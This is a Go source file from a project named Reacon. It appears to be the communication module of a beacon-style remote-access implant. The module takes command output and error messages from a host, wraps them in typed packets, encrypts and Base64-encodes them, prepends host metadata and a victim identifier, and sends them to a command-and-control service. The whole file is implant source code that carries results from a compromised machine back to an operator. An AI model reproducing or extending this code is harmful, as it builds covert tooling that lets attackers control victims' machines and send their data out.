package communication

import (
	"Reacon/pkg/encrypt"
	"Reacon/pkg/utils"
	"bytes"
	"encoding/binary"
	"fmt"
	"sync"
	"time"
)

func ErrorProcess(err error) {
	errMsgBytes := []byte(err.Error())
	result := errMsgBytes
	fmt.Println(err)
	criticalSection(31, result)
}

func DataProcess(callbackType int, b []byte) {
	result := b
	var err error
	if callbackType == 0 {
		result, err = utils.CodepageToUTF8(b)
		if err != nil {
			ErrorProcess(err)
		}
	}
	criticalSection(callbackType, result)
}

var mutex sync.Mutex

func criticalSection(callbackType int, b []byte) {
	mutex.Lock()

	finalPaket := MakePacket(callbackType, b)
	finalPaket, _ = encrypt.Encrypt(finalPaket)
	finalPaket, _ = encrypt.EncodeBase64(finalPaket)

	MetaLen := len(utils.MetaInfo)
	MetaLenBytes := utils.WriteInt(MetaLen)

	msg := utils.BytesCombine(MetaLenBytes, utils.MetaInfo, finalPaket)
	normalDataInt := 2
	normalDataBytes := utils.WriteInt(normalDataInt)
	msgToSend := utils.BytesCombine(normalDataBytes, msg)

	Send(Service, utils.Uid+fmt.Sprintf("/client_%020d", time.Now().UnixNano()), msgToSend)
	mutex.Unlock()
}

// replyType(4) | result  并加密
func MakePacket(replyType int, b []byte) []byte {
	buf := new(bytes.Buffer)

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := encrypt.Encrypt(buf.Bytes())
	if err != nil {
		return nil
	}

	buf.Reset()

	buf.Write(encrypted)

	return buf.Bytes()

}
